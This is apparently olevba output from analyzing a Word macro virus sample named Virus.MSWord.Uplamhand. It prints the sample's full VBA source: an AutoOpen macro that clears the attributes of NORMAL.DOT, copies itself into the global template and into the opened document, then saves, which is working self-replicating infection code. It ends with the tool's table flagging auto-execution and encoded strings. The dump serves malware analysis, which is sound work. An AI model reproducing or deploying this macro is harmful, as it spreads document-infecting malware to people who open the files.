olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Uplamhand
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim curtime$
Dim curdate$
Dim TimeandDate$
Dim file$
Dim filePM$
Dim fileND$
Dim informationGroup$
Dim informationAutor$
Dim informationCopyRight$
curtime$ = WordBasic.[Time$]()
curdate$ = WordBasic.[Date$]()
TimeandDate$ = "Date:" + curdate$ + " " + "Time:" + curtime$
WordBasic.MsgBox TimeandDate$, "The Date and Time Is"
On Error Resume Next
file$ = WordBasic.[FileName$]()
filePM$ = WordBasic.[FileName$]() + ":AutoOpen"
fileND$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
informationGroup$ = " Association of Professionals in Computer Scince"
informationAutor$ = "Limbo"
informationCopyRight$ = "(c) January 2000"
If GetAttr(fileND$) <> 0 Then SetAttr fileND$, 0
WordBasic.Organizer Copy:=1, Source:=file$, Destination:=fileND$, Name:="AutoOpen", Tab:=3
WordBasic.MacroCopy "AutoOpen", filePM$
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

